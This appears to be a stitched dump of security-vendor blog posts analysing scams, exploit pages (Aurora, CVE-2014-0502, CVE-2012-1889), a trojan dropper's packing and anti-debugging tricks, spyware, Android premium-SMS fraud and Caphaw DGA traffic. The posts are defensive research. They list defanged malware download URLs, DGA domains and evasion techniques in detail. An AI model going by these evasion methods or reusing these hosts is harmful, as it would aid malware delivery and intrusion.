Unsurprisingly, it was all too easy to find examples of this as it is almost a given that scammers will attempt to profit from any breaking news story, especially those where the public is desperate for the latest tidbit of news - regardless of where it may be coming from.\r\nAdvertising Scam\r\nThe first example is an advertising scam. The scam begins with the infection of a legitimate site, in this case debiworley[dot]com, a personal website for a photographer. A subdomain has been added to the site, which hosts different scams, all leveraging the same approach. In the case of the MH370 scam, an alleged video has been posted to alert[dot]debiworley[dot]com/news/?mh370. At that page you\'ll see the image shown below, which purports to show a Malaysian Airlines plane crashed in the jungle:\r\n \r\n\r\n\r\n \r\n\r\nThe page includes the fake video and also includes comments formatted to appear as though they\'re from Facebook. Despite the look of the page, everything is simply an image. Clicking anywhere on the video doesn\'t actually play the video, but instead prompts the user to share the video on Facebook by presenting the following popup, before it can be played.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nIf the user chooses to share the video, it does not ever play, but instead simply shares the scam with their Facebook friends. What the victim is promoting is a quickly hacked together site hosted at vinreox[dot]com, a simple website that acts as a front end for various YouTube videos and the owner profits from advertisements on the site.\r\n\r\n \r\n\r\n\r\n\r\nNote: The owner of the infected website has been informed of the infection.\r\n\r\nPay-Per-Click Scam\r\n\r\nThis time around, the scam appears to be hosted at a site controlled by the attacker. There are various URLs on the domain that ultimately link to the same content, but one in particular (rentadp[dot]com/malaysia/) appears to be piggybacking on the MH370 disappearance. When visiting that URL, the victim is redirected to a completely fake Facebook page.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nOnce again, most of the page is nothing more than an image and the only links either refresh the page or prompt the user to share the scam on their real Facebook profile before they can view the video. It would appear that the scammers were a bit lazy this time as despite the URL referencing \'Malaysia\', they\'ve clearly used a picture of US Airways Flight 1549, which crash landed on the Hudson river in 2009.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nShould users choose to share the scam, they won\'t ever see the video, but instead will be redirected to a pay-per-click scam which requires yet another task, this time around the victim must fill out one of three surveys before they can proceed. This is where the the scammers make money. They\'re paid a few cents for every survey completed.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nUnfortunate that anyone would seek to profit from a tragedy, but unfortunately, this has now become the norm.\r\n\r\n \r\n\r\n- Michael', 'Phishing', 'https://www.zscaler.com/blogs/research/scams-taking-advantage-malaysia-airlines-370-disappearance');

Adobe has now released a security bulletin regarding this vulnerability. Based on the attack vector mentioned in prior research, we have concluded that recently observed .SWF exploitation is related to the recent zero-day threat flagged as CVE-2014-0502. Upon successful infection, the exploited victim is served a RAT (Remote Access Trojan).     While we were doing our daily review of logs, we found a significant number of transactions related to this campaign. We specifically started looking for those compromised servers which have been mentioned in prior research.  We began investigating all suspicious transactions which used a known compromised site as a referral location.            After some brief inspection of this location, we found not only the malicious .SWF, but also all other connected malicious files detailed in the analysis below. We will cover the dropped Flash file that exploits the vulnerability using an image that contained embedded shell code. This shellcode is then used to download the malware.    The Flash file was found to be encrypted using the DoSWF flash encryptor.           Upon throwing the Flash file into an ActionScript viewer, we immediately see the script shown below. The script tries to make a URL Request to a GIF Image file, which contains the embedded shellcode for an ROP exploit.       The script checks for the presence of a cookie labeled \'XPT2013111\'. If this cookie is not already present, it sets the same.               The script then checks the operating system version and in the case of Windows XP, further checks the OS language. Details of the OS language and version are then used to determine the base address for the exploit. In case of Windows 7, the script further probes for unpatched and outdated versions of Java (Web Start 1.6 and 1.7) or Microsoft Office (Sharepoint OpenDocuments 3 or 4).          Here we can see on XP, based on the version and language, the base address for the exploit is determined by the script. Then the ROP sled is built to carry out the exploit.       The GIF image used for embedding the shellcode is shown below, which of course seems innocuous to the victim.                                            When opened in a hex editor, the magic bytes for a GIF image file can be seen.                 However, upon careful examination, we further see extra bytes appearing toward the end of the image as shown below.                         Using a shellcode emulator like libemu, we can see that this extra data represents the shellcode to be executed.                    Here we see that the shellcode makes a call to the LoadLibraryA function and then to VirtualProtect to allocate memory in which to place the shellcode. It then checks for the /temp folder path and makes calls to InternetOpenUrlA to download the malware from a remote location http://[x.x.x.x]/common/update.exe and drops it into the /temp folder.    A sandbox analysis of the final dropped file can be seen here.    Browser plugins continue to be the Achilles heel of enterprise security. While enterprises struggle to ensure that browser plugins are up to date on all end user systems to prevent browser exploit kits from targeting known vulnerabilities, here we see yet another demonstration where even that is not enough.

The malware can actually receive a set of commands and execute them in an infected machine    At the time of analysis, the server to which the malware communicates seems to be down. Therefore, in order to fully understand how the malware communicates and also to demonstrate how effective and damaging this Bot is, I have decided to create an HTTP server and issue commands to the bot directly.         We can see from the code below, the wide range of commands that can be executed by this Bot. The commands are simple and self explanatory.                 	  		  			  		  		  			Figure 8: Remote Commands  		  	                     Let\'s see the effects of a few of these commands in detail. The “execute” command is capable of executing additional VBScript statements in the infected machine. The “update” command is issued to update the Bot , while “uninstall” removes the Bot entry from the Windows registry and startup folder.         There are also commands such as “send”, ”recv” and “site-send”. Interesting commands include “enum-driver”, “enum-faf”, “enum-process”, “cmd-shell”, “delete”, “exitprocess”.         Let us execute our server and wait for the Bot to connect to us and send information so we can then issue commands.                	  		  			  		  		  			Figure 9: Malware callback  		  	                As seen in the image above, a “POST” request is made with it\'s path as “/is-ready”, indicating    that the Bot is up and ready. We can also observe information about the infected machine such as “volumeserialnumber”, “computername”, “username”,“operating system type”, installed    “anti-virus name” etc. To retrieve such information, the malware relies on Windows Management Instrumentation (WMI) queries.         Let us issue the command “enum-driver”. This command fetches the drive name and drive type of the infected machine as seen in the image below.           	  		  			  		  		  			Figure 10: enum-drive  		  	             The next command “enum-faf” enumerates and fetches the content of an input directory or drive of the infected machine.                	  		  			  		  		  			Figure 11: enum files   		  	                  The “enum-process” command fetches a list of processes that are running on the infected system.                	  		  			  		  		  			Figure 12: enum-process  		  	        The “cmd-shell” command will allow the attacker to execute all DOS commands on the infected    system.                	  		  			  		  		  			Figure 13: Execute Dos Command  		  	                     Those are just a few of the powerful commands that the malware can execute in the infected system. This gives the malware near limitless power to control and steal data from the infected machine.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (204, 'The Story Of A Trojan Dropper III', 'ThreatLabz', 'January 09, 2014', 'Introduction:    In previous posts (story of Trojan dropper part I, II) we performed both static and dynamic analysis on the threat and also developed a broad idea of what the malware was doing in it’s initial stages. We now set out to investigate the reason behind the crash of the dropped file (“Adobe.exe”) and at the same time we want to retrieve the payload from this particular malware sample.    Analysis:    Let’s go ahead and debug the file. This file (“Adobe.exe”) was found to be packed (custom variant) and the unpacking routine is similar to the approach detailed in part II of this post, so let’s skip all the gory details and dive right into it.    After unpacking the entire binary in memory, control is transferred to a newly unpacked region at the address \"0x401634\". Now the action begins from here and we get our first decryption routine, which is a simple 1-byte XOR with a static key as seen in the image below which reveals more code         	  		  			  		  		  			Figure 1: Decrypt code  		  	      If we carefully look at the new code below, we can observe that it is riddled with JMP instructions and occasionally we find a few garbage values. The code is crafted in such a way that it resists disassemble attempts which makes reverse engineering the sample more difficult and somewhat painful.    Hidden in between these JMP’s in plain sight is an instruction that is familiar to us by now(i.e the instruction to fetch the address of PEB (Process Environment Block)).         	  		  			  		  		  			Figure 2: Fetch address of PEB  		  	      At this point we can only speculate on why the malware needs the PEB address. Moving further in the code, we encounter another decryption point that is exactly same as the first one, which decrypts more code. Now the control is transferred to the newly decrypted code.         	  		  			  		  		  			Figure 3: NtGlobalFlag (anti-debug)  		  	      In the image above, we have an interesting bit of code. Recall that the malware already collected the address of PEB. At this point, using the instruction CMP DWORD PTR DS:[EDI+68], ECX (here EDI holds the address of PEB which is \"0x7FFD4000\" and ECX holds a constant 0x70 ) a comparison is performed, after which a JNZ instruction decides the fate of the control flow.    Here we get our first glimpse of the anti-debugging technique employed by this malware. The instruction CMP DWORD PTR DS:[EDI+68], ECX compares the value of the ECX register (i.e. 0x70) to the location in the PEB structure known as “NtGlobalFlag”. The field is set to a value of “0x70”, if the process is spawned under a debugger.    In our case, this is true since we are debugging the file. Finally, the JNZ instruction at \"0x401511\" is not taken, which lands us in an invalid region in memory, thus triggering the anti-debugging. Let’s jump here and continue with our analysis. We now have another layer of decryption, which reveals more code after which, as usual, control is transferred to this region.    We then reach another piece of code, which is revealed only if we keep up with the control flow.         	  		  			  		  		  			Figure 4: File-path, name identification (anti-debug)  		  	    The above code uses “strstr” to look for a string named “sample” anywhere in file path of our currently debugged file. If found, “strstr” returns a pointer to first occurrence of search string(i.e \"sample\") in file-path, or else it returns zero. The malware then checks the return value in EAX and takes a conditional jump in the form of JE instruction at \"0x401135\". If the jump is not taken, the code lands in “ExitProcess”, a call which terminates the process.    This is the second anti-debugging technique the malware employs, although not-an effective one in my opinion considering the odds of a file-path or malware name containing the name “sample”.         	  		  			  		  		  			Figure 5: GetVolumeinformation, Volumeserial (anti-debug)  		  	      Again, here we have another anti-debugging technique where the malware retrieves the Volumeserial number using the API GetVolumeinformation and compares it with  “0CD1A40” and “70144646”. If either comparison matches, the code jumps to the ExitProcess call.    Another anti-debugging technique follows immediately thereafter in the form of “EnumSystemLocalesA”. The first argument that \"EnumSystemLocalesA\" accepts is a pointer to the callback function. Here the malware does a neat trick. If we look at the code below, at address “0x401179” a constant “0x2” is pushed onto the stack, which is followed immediately by a CALL.     When this CALL is executed, it pushes the return address onto the top of the stack (which is \"0x401180\") and the EIP (Instruction pointer) now lands at the \"EnumSystemLocalesA\" call. Now if we observe the stack, the value on top of the stack is the return address, which naturally becomes the callback function address for \"EnumSystemLocalesA\" . When the \"EnumSystemLocalesA\" API is executed, control falls to the callback function, which continues the execution of the code.          	  		  			  		  		  			Figure 6: EnumSystemLocalesA (anti-debug)  		  	      Let\'s now continue our debugging from the address “0x401180”. Not far from here, yet another anti- debugging technique is uncovered. This time the malware retrieves the ‘Diskname’ from the registry.          	  		  			  		  		  			Figure 7: Diskname (anti-debug)  		  	      \"RegOpenKeyExA\" (HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Disk\\Enum)  and  \"RegQueryValueExA\" then uses “strstr” and searches for signs of a virtual environment such as “Xen”, “Vmware”, “Qemu” and also looks for string “virtual”.         	  		  			  		  		  			Figure 8: Search vm strings(anti-debug)  		  	    Once the malware detects a virtual environment, it changes the control flow and land us in an invalid memory region. If we play along, we can observe something interesting here.         	  		  			  		  		  			Figure 9: Adobe.exe crash  		  	    There we go. We can finally reproduce the crash that happened during the first stage of our analysis.  Ok, so a through binary analysis is often not so straight forward after all !!!       	  		  			  		  		  			Figure 10: sandbox identification(anti-debug)  		  	    Let’s move on and see what surprises the malware has this time. Below, we can see anotherpiece of code that checks for a DLL name called “sbiedll” . Here, the malware checks whether it is run in a popular sandbox called “sandboxie”. If found, as usual, the malware bails out.      Immediately afterward, the malware performs a decryption routine to reveal compressed data, which is again packed with aplib and below we can observe the aplib unpacking routine which decompresses the data to a PE file.         	  		  			  		  		  			Figure 11: Aplib decompression routine  		  	      Soon after, control is passed to the newly decompressed file. Below, we can see the new file being executed.         	  		  			  		  		  			Figure 12: New PE-file in memory  		  	      Debugging further, we can observe the malware revealing the final trick that it has up it’s sleeve ,which I will explain in the next post in this series.', 'Analysis;Encryption;Malware', 'https://www.zscaler.com/blogs/research/story-trojan-dropper-iii');

Now it\'s legitimate as it advertises exactly what it does, but based how this same application is packaged and distributed in other markets, it\'s clear that the vendor is also targeting another, less altruistic audience with this same application. The app also illustrates the powerful access permissions that an application can gain so long as the end user agrees to it, either explictly or otherwise.    Details about the application:    Name: SMS Tracker.    Installs: 10,000-15,000.    Description: http://smstracker.com/    As per the description on the application’s Google Play page, the application is able to do the following:           	SMS Tracking – Intercepts text messages. Read all inbound and outbound text messages. Details include time and date, phone number, contact name and location of the target phone. Complete Text message tracking and logging.  	MMS tracking - Intercepts MMS multimedia messages. Read and view all inbound and outbound MMS messages. See what photos are sent to and from the target phone. Details include photo, time and date, phone number, contact name and location of the target phone.  	Browser Tracking – monitors all web browser activity on the target phone. Know which websites were visited, which pages were viewed and when.  	GPS Tracking – Logs GPS location information wich can later be viewed on a map. Know when and where the phone was located at all times. Breadcrumbs to record location information allowing parents to locate their children at frequent intervals. GPS logging occurs at a user defined rate (default interval is 5 minutes). Remote GPS logging and viewing give you the ability to see the location of your child’s phone, from any web browser. The breadcumb trail offers powerful GPS Tracking.  	Call Logging – Monitors all inbound, outbound and missed calls. Identifies the phone number, contact name, call duration, and location of the phone for every call.  	If you want to know where your kids are, just send them a text message.

Next, you need to go to http://smstracker.com, where you will be asked for your login name and password ,which was registered at a time of installing the application.           This screenshot shows the dashboard after login.             This screenshot shows the page where you can see logging from the device. It covers SMS, device information, call logs, network traffic, location details, etc.              Zscaler’s concerns:         In any other context, an application with these capabilities would clearly be labelled as spyware. At the vendor\'s (https://smstrackerweb.com/download.php) they are selling a repackaged version of this app which has the same functionality but does not leave an icon on the device, thus making it more stealthy and harder to detect following installation. This version also does not contain the notification icon or privacy policy screen. Why the transparency? What audience is this version targeting?         This same application could also serve generic template for other spyware projects by being wrapped with other code to provide the core functionality needed to create another malicious app.          This type of app clearly shows the powerful level of access that can be granted to Android apps, so long as users grant permission. An app can access SMS, call logs, network traffic, hardware details, screen details etc. Always carefully read the permissions requested by an application before installing it on your device.              The vendor is promoting this application as a tool for monitoring the mobile activities of your children. However, this same app would be a very effective tool for spying on someone once installed on their phone. You just need to install the app on the device which you want to spy and you are done. All the information about the device and all call and SMS logs can then be remotely monitored.         Moreover, all of the user\'s private data is stored on the vendor\'s server. What guarantees are in place that the private data will remain private? In the increasingly common enterprise world of “Bring Your Own Device” (BYOD), such applications could be leveraged to expose corporate contact lists, email, browsing information and collect private data from corporate apps in the workplace. Enterprises often block access to \'non-official\' app stores to prevent the installation of such apps, but this illustrates that such a restriction is no guaruntee that spyware can\'t be installed from an official source.              Virustotal scan results:    The application available from the vendor site (smstracker.com):         https://www.virustotal.com/en/file/21aa6c6652287413f07ddfbcadea84441a500ee12816dfe4beed913e4a0fa636/analysis/    The Google Play store’s version:         https://www.virustotal.com/en/file/a3b40fa9fea9600b55d4d07fd4f0358ee74e6924c342c5857c2a5311f7a11ed3/analysis/         Interestingly, despite virtually the same functionality, far fewer AV vendors flag the Google Play version as malicious.              - Viral', 'Mobile', 'https://www.zscaler.com/blogs/research/want-spy-google-play-will-help-you');

After completing the analysis,  I\'ve  decided to blog about the threat. Given the amount of information derived during the analysis, I\'ve decided to divide the blog into multiple parts.        Modern day malware generally implements some kind of packing or obfuscation on the binary, in order to evade antivirus detection. Hence, it’s a good idea to determine which packer may have been used while analyzing the file. In order to do this, I implemented a popular tool called PEiD to check for the existence of a known packer.     As we can see above, PEiD was not able to pick up anything from this file, but that doesn\'t mean that the file is not packed. Let’s have a closer look at the file.    While going through the file sections, one of the sections (.data) contained an unusually large amount of data, which at first glance gave the impression that it is obfuscated. This is an important clue and something we have to keep in mind while debugging the file.         While looking at the resource section, we can see that the file icon resembles that of a PDF file, which adds to our suspicion. Also, the file is not digitally signed.    Lets go further and execute the file. When doing so, I was greeted with a crash report where Windows was telling me that “Adobe.exe” had crashed during execution.    We knew from the beginning that this was not a proper PDF file and would not therefore work with Adobe Reader. Let’s now look to determine where Adobe.exe exists in the file system.

Keeping this in mind, I began by debugging the file, hoping to find the reference to the data section in order to determine precisely where the encrypted portion of data was to be found.    Fortunately, I was not disappointed and was soon able to find the reference point.         	  		  			  		  		  			Figure 1: Obfuscated data   		  	      After further debugging, we are able to see the code decrypted in memory.

This is a common technique found in shellcode and file infectors where one needs to get the address of the region that is currently being executed.       When this CALL is executed, it pushes the return address onto the stack (in this case it is the address of POP EBX). Now POP EBX is executed, as that instruction pops the value from the top of the stack to EBX. The address is then added to a constant of 0x33, to point to the region that is then decrypted by the decryption loop. This reveals more code, after which a JMP instruction transfers the control to the newly revealed code.    Further, I was able to identify another interesting piece of code here. The code below retrieves the address of the PEB (process environment block) and navigates to PEB_LDR_DATA->InLoadOrderModuleList, where it retrieves the names of the loaded modules (DLL’s) .         	  		  			  		  		  			Figure 6: Fetch base address of kernel32.dll  		  	      There\'s another catch here. The malware looks for specific DLL’s (in this case kernel32.dll), but instead of using the string kernel32.dll to compare with retrieved module names from the PEB, it carries the hash of the DLL names and then calculates the hash value for the retrieved module names and compares them. This allows the malware to make minimum noise and avoid some antivirus rules.         	  		  			  		  		  			Figure 7: Dll name hash   		  	      Once the malware gets kernel32.dll, it then retrieves the base address of the kernel32.dll, which in this case is 0x7c800000. Now, using the PE file format, the malware moves to the export table of kernel32.dll, as illustrated in the code below,         	  		  			  		  		  			Figure 8:  Finding exportaddresstable of kernel32.dll  		  	      Looking at code above the instruction MOV EBX, DWORD PTR DS:[EAX+78], lands us at the datadirectory-->exportaddresstable of the kernel32.dll. The malware then retrieves the value and adds it to the imagebase (ie 0x7c800000) in order to reach the export table, where it retrieves the address of the exported function. Here too, the malware never uses the names of the function, but instead it uses a stored hash.       After further analysis, we stumble onto another piece of code, which copies data again from the data section to a newly allocated memory region.           	  		  			  		  		  			Figure 9: Copy more data   		  	      Investigating further, we see that this data is decrypted to reveal what looks like some sort of an address table.         	  		  			  		  		  			Figure 10: Address table   		  	      The table has significance as it is used as an address calculator, To calculate the address of  the region from where it copies bulk data, Which is further decrypted to form what looks like    a compressed file.         	  		  			  		  		  			Figure 11: Compressed data  		  	      And there it is. Moving ahead, we land in the decompression routine, which quickly reveals that  the data is compressed using “aplib”.             	  		  			  		  		  			Figure 12: Aplib decompression routine  		  	           Once the decompression is completed it does some familiar actions by flushing out the bytes of the original EXE file starting from the imagebase 0x400000 and copy the decompressed data to its new imagebase (i.e 0x400000)         	  		  			  		  		  			Figure 13: Copy decompressed PE -file   		  	      Finally using “LoadlibraryEx” and Getprocaddress the IAT is rebuild in the memory after which the control is transferred to the new code at the address 0x401021         	  		  			  		  		  			Figure14: Rebuild IAT in memory  		  	      The job of this code is limited. It writes a PE-file which is embedded within itself into the temporary folder as “Adobe.exe” using the api “GetTempPathA”.         	  		  			  		  		  			Figure 15: Transfer control to OEP  		  	      In the end, the file (Adobe.exe) is dropped in the temp folder and executed using the API “ShellExecuteA”.         	  		  			  		  		  			Figure 16: Execute dropped \"Adobe.exe\"  		  	      A dummy PDF file is also written to the current directory named “Bestellung.pdf”. In a subsequent blog post, we will see why the malware dropped this PDF file.    That’s all for now. In the next post, we’ll continue the analysis of the dropped file “Adobe.exe”', 'Analysis;AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/story-trojan-dropper-ii');

Every day a new device is being launched and hence increasing the number of online transactions. BYOD (Bring Your Own Device) has further complicated the security challenges of enterprises as they’re now responsible for protecting data on devices that they don’t own. At the same time, mobile application developers are coding new apps every day, without focusing on security/privacy related issues.    In this Post we will focus on analyzing the ATN Live TV App for iOS using our own free service ZAP(Zscaler Application Profiler). If you aren’t familiar with ZAP, it’s a simple web application which allows anyone to quickly analyze the security/privacy issues of any iOS or Android app by dynamically inspecting the web traffic generated by the app. Please have a look at our previous blog post or videofor more information.         Let’s begin.                  App Name: ATN Live TV    App Store link: https://itunes.apple.com/in/app/atn-live-tv/id525948724?mt=8    Category: Entertainment                                                 You will need to provide the APP URL and some fake credential to ZAP in order to analyze the traffic for security/privacy leaks.                       Once you are done with this, you’ll need to set the proxy setting on your device to point to ZAP. Hit the Proxy Scan button and follow the instructions for setting the proxy on your particular device.    In this analysis, we found that ATN Live TV is leaking passwords and Email IDs.                                As you can see, the Email ID and the MD5 hashed password is being transferred to the server via GET request using HTTP. While the password is hashed via MD5, you can see that the data is not transmitted in an encrypted (HTTPS) channel. While MD5 is a one-way hash, an attacker that was able to sniff this traffic, could perform a dictionary attack to retrieve the clear text password.    Here is the Final Risk Score Report of ATN Live TV app from ZAP.              Conclusion    With the explosion of mobile app development, we’re seeing an increase in data and privacy leaks. This is occurring for the same reason that we saw so many web application vulnerabilities a decade ago – there are many new developers entering the space but few have access to the tools and knowledge necessary to develop secure apps and apps are often published without an independent security audit.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (211, 'Aurora Exploit Still Floating ...', 'ThreatLabz', 'December 17, 2013', 'It\'s been around two years since Microsoft released a patch for the IE 0day famously known as the Aurora exploit (CVE-2010-0249). We had blogged about this in the past when it was first seen in the wild on the \'GOV.CN\' domain. This vulnerability targets IE version 6. Despite the passage of time, we continue to find live exploits for this vulnerability. Recently, we found a new URL which is serving the Aurora exploit code.         Exploit URL: hxxp://www.artbridal.com/bizcodi/gm/news.html         Let\'s take a look at the exploit code being delivered.                              The exploit is delivered via obfuscated JavaScript code, although the level of obfuscation is not very high. Some of the strings and JavaScript function names are been obfuscated. The following is a snapshot of the de-obfuscated code.                  If you observe the first image, the SPAN tag holds an IMG tag on which the \'onload\' event calls an event handler  function \'eve\'. This in turn creates an event object called \'e1\', using the \'document.createEventObject\' method. Then, by using an \'.innerHTML\' property, it assigns a null string to SPAN object \'sp1\', but instead, the \'sp1\' object is removed. In the function \'eve\', the freed object is referenced, causing memory corruption in the form of an access violation in IE. To exploit this condition, the exploit code uses a typical heap spray technique to load the shellcode into memory for the execution. When the shellcode is executed, it tries to download a malicious file from the URL \'hxxp://fly-tld.ru/w.php?f=47&e=3\'.  For a more detailed analysis, you can refer to this blog.    To obtain the aforementioned URL, the PE executable file was formed and extracted from the shell code in the exploit. The EXE was then examined using a debugger to extract the URL as can be seen below.                       This URL is down at the moment, so further post exploitation analysis was not possible.         Reports:    VT URL Scan on found URL : 4/51 detections.    VT File Scan on EXE formed from Shellcode: 27/41 detections.       Various other URLs that have been seen in the past with similar patterns - \'/w.php?f=(\\d){2}&e=(\\d){1,2}\' include:    hxxp://synergyledlighting.net/w.php?f=56&e=4  hxxp://nicesextubes.co/w.php?f=18&e=6   hxxp://iplaecrcocee.com/w.php?f=26&e=2  hxxp://iplaecrcocee.com/w.php?f=26&e=2  hxxp://examine.arsb.co.uk/w.php?f=20&e=2  hxxp://exciting.simssocialcheat.com/w.php?f=22&e=2  hxxp://oyacromifh.com/w.php?f=26&e=2  hxxp://eteaescopr.com/w.php?f=26&e=2     The obvious reason behind attacking old CVE\'s is the belief of attackers, that there are still un-patched and outdated browser\'s out there on end user machines. Sadly, they\'re correct. To avoid such attacks we suggest updating browsers with latest patches and migrating to the most recent version of the browser.     Stay updated, Stay Safe!

This application is using telephony services as shown in the code as well as in static analysis. You can see the use of premium telephone numbers.        In this particular screenshot, you can see functions which are using phone services for making calls to the premium numbers in order to generate revenue as the numbers would be controlled by the attackers and earn a small payment for each call made.        Here you can see that the application is harvesting SIM card information.            This application also checks for mobile data and the WIFI network status to determine if Internet connectivity is available.      The code includes a hardcoded list of premium telephone numbers, which are all located in China.                               In this screenshot you can clearly see that application also keeps watch on the screen and keyguard status (on/off).    This screenshot clearly denotes that the application tries to send SMS to the premium rate numbers previously seen in the code. Forcing Android applications to initiate calls to premium phone numbers controlled by the attackers is a common revenue generation scheme that we see, particularly in Android application distributed in third party Android app stores.        Here you can see various function names which are suspicious such as call, dial, disableDataConnectivity, get call location, etc. These functions suggest that the application is also trying to keep watch on other phone calls too. Function getCallstate, endCall, Call, CancleMissedCallNotification Illustrates that the application tries to control phone call services.    The application installs itself silently. Once installed, no icon is observed for this app. Also shown in the previous screenshot is the fact that the application waits for the screen and keyguard events before triggering its malicious activity. It does all of the activity without user intervention. This allows the malware to function without a suspicious icon on the home screen that just one of  technique used by malware authors to evade its presence to the device owner.            From above screenshots, you can see that the application is using the XML listener service.  Also, in the second screenshot, you can see that the application is trying to create a URL by assembling various strings. This is likely command and control (C&C) communication sent to a master server. The parameter &imei denotes the harvesting of the phone\'s IMEI number for tracking the device.    In conclusion, this malware will defraud the victim by silently forcing the phone to initiate premium rate SMS billing to generate revenue. The application may give control to the author for monitoring or controlling phone calls.

infection occurs on the victim\'s PC, it creates an autostarter that hooks into explorer.exe to add a level of resilience to hinder standard AV removal methods.  At the time of research, the MD5 (fa33c07e27e4a1e9f1ecdf1172f12562) was being detected by 8/46 AV engines on Virustotal.               The main function of Sharik is to leave the victim open to further infection.  To do this, the infection will set up a backdoor and communicate with it\'s CnC.  The attacker can choose to attack the victim further later on.  The standard communication between the victim and attacker appears to take place on a non-standard port 35618.  Given the high volume of variants of this threat, it is advised to close this port or at least monitor it for suspicious activity.                                It should also be noted that many of the above mentioned download locations are involved in other threats.  For example, main-firewalls[.]com is very closely related to Nymaim ransomware.  Another example is the md5, 771cc060cf15fc29290a0109c1cf7669, which is a Fareit variant.  So what is a ransomware application and a FTP stealing trojan doing displaying the same phone home activity as a resilient backdoor Trojan?  This activity hasn\'t been tied to on specific group at the time of research, but administrators and users should be on notice.  Where there is smoke there will inevitably be fire.  So if you suspect you or the users you are responsible for are seeing HTTP traffic like the above mentioned, then it definitely merits further investigation.

Lets take a look.           The site hxxp://wm.17wan.info:9999/zx/zip.html?mag.fznews.com.cn is a Chinese site, which targets online gamers by serving malicious code which exploits Microsoft XML Core Services. This attack allows  a remote attacker to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site. The site serves highly obfuscated code to evade antivirus solutions.     VirusTotal lookup    https://www.virustotal.com/en/file/3eaf208c67ec268b969f260f55ef7d70fd06f3b086a6dcc9fdfb57758dd62240/analysis/1380076165/  You can see the highly obfuscated code served by the malicious site in the screen shot below.                The highlighted code shows that the a CLSID object is being used, which is exploited by parsing long strings of the letter “A”. This CLSID object is related to the vulnerability detailed in CVE-2012-1889.    Lets take a look at a beautified version of this code.             This highlighted section shows the suspicious function, which leverages the shell code for exploiting the vulnerability.             Here function heapLib() performs a heap spray. You can see the complete series of functions utilized in the full attack.    Let\'s decode the script which is shown in first screen shot                                               The decrypted source code shows that random named parameters are used for obfuscation of the original code. The chunks of code are combined into a final code snippet, which is then decoded again for making the actual shell code. Here you can see that the variable “t” is using the “MYKEY” parameter and “MYKEY” is using the “MY” parameter to construct the final chunk. This final chunk is again decoded by the function utf8to6() and nbcode(), which are defined in the source code for the final payload and that is used by the window object. At the end of the code the “t” variable generates the final javascript snippet which executes the shellcode.                       This is the javascript which is generated at variable “t”.  Again, this script is obfuscated. Obfuscation is primarily used by malware authors to avoid antivirus detection. It should be noted that malware authors do not always leverage 0-days, in fact most technical attacks utilize known vulnerabilities as attackers know that a large percentage of PC users have not applied the latest patches.                An interesting observation is that the javascript is written in such a way that it only works on IE.

About Win32/Caphaw     The Caphaw trojan is a financial malware attack that functions similarly to the Carberp, Ranbyus, and Tinba threats according to analysis done by WeLiveSecurity Researcher, Alekandr Matrosov. These attacks are carried out utilizing stealth tactics both on and off the wire.  Caphaw avoids local detection by injecting itself into legitimate processes such as explorer.exe or iexplore.exe, while simultaneously obfuscating its phone home traffic through the use of Domain Generated Algorithm created addresses using Self Signed SSL certificates.  This limits the ability of traditional network monitoring solution to dissect the packets on the wire for any malicious transactions.  Caphaw attacks major European banks and previous analysis has shown that the malware is most active in the UK, Italy, Denmark and Turkey. This is especially prevalent considering the mapped known infected nodes seen here.     The geoip (location) information derived from the infected host is of special significance to this malware. The malware leverages the following legitimate URL: hxxp://j.maxmind.com/app/geoip.js to discover geoip information about its freshly infected victim.  Administrators should view this transaction as a starting point for their investigation into any suspicious activity. It is not a malicious service, but illustrates how malware writers can leverage even legitimate services. The infection uses the output of this script to extract location information about the infected host/victim.         At the time of research, we were unable to identify the initial infection vector.  We can tell that it is more than likely arriving as part of an Exploit Kit honing in on vulnerable versions of Java.  The reason we suspect this is that the User-Agent for every single transaction that has come through our Behavioral Analysis (BA) solution has been: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_07.           	  		  			  		  		  			The UserAgent for known drop locations of this are manipulating users with Java version 1.6.07  		  	      The variation in the dropped executable is different across every instance, so its no wonder standard AV is having a problem keeping up (1/46 at time of research). This AV performance also indicates that the likelihood of someone proactively catching this infection inside their network is fairly low at the time of this writing.    Use of DGA       A domain generation algorithm (or DGA) represents an algorithm seen in various families of malware to generate a large number of quasi-random domain names.  These can be used to identify the malware\'s command and control (CnC) servers so that the infected hosts can \"dial home\" and receive/send commands/data. The large number of potential rendezvous points with randomized names makes it extremely difficult for investigators and law enforcement agencies to identify and \"take down\" the CnC infrastructure. Furthermore, by using encryption, it adds another layer of difficulty to the process of identifying and targeting the command and control assets.        What initially drew us to this threat was the use of DGA following the execution of the dropped malicious package. We ran three test instances of the attack sequence in our Behavior Analysis (BA) lab to illustrate the use of DGA in the malware\'s attack sequence:         Instance 1    cso0vm2q6g86owao.thepohzi.su    5qloxxe.tohk5ja.cc    k2s0euuz.oogagh.su         Instance 2    v8ylm8e.thepohzi.su    2g24ar4vu8ay6.tohk5ja.cc    d6vh5x1cic1yyz1i.oogagh.su         Instance 3    t2250p29079m6oq8.thepohzi.su     ngb0ef99.tohk5ja.cc        nxdhetohak91794.oogagh.su         The pattern (\"ping.html?r=\") is commonly known to be used by past versions of Caphaw.  Don\'t panic straight away if you see this string in your user logs however as it is also commonplace among sites that use \"outbrain.com\" services.  You\'ll want to look for any URI path that uses /ping.html?r= that does not contain \"/utils/\".  Hopefully that helps narrow the search to see if you\'ve encountered transactions similar to the following screenshot.      	  		  			  		  		  			DGA is used to hide the phone home activity of the initial detection  		  	      Across all 64 distinct samples we\'ve collected of this threat thus far, there have been 469 distinct IPs where there has been a call to a DGA location.  A small sample of those illustrate the connection between the phone home data collected via network logs and the BA of the Caphaw samples.                	  		  			  		  		  			The DGA used here shows a connection between Caphaw phone home activity and Sandboxed samples of the threat in question  		  	      Use of SSL encrypted communications        The initial indicators were in the form of mysterious self-signed SSL traffic between end user hosts and various points of presence on the Internet, potentially components of the malware’s CnC infrastructure.  See the screenshot below showing the self signed SSL cert. used in the malware communication:      Other screenshots below show the SSL handshake between the infected hosts and the remote CnC servers:           	  		  			  		  		  			SSL communication between infected host(s) and the remote CnC servers  		  	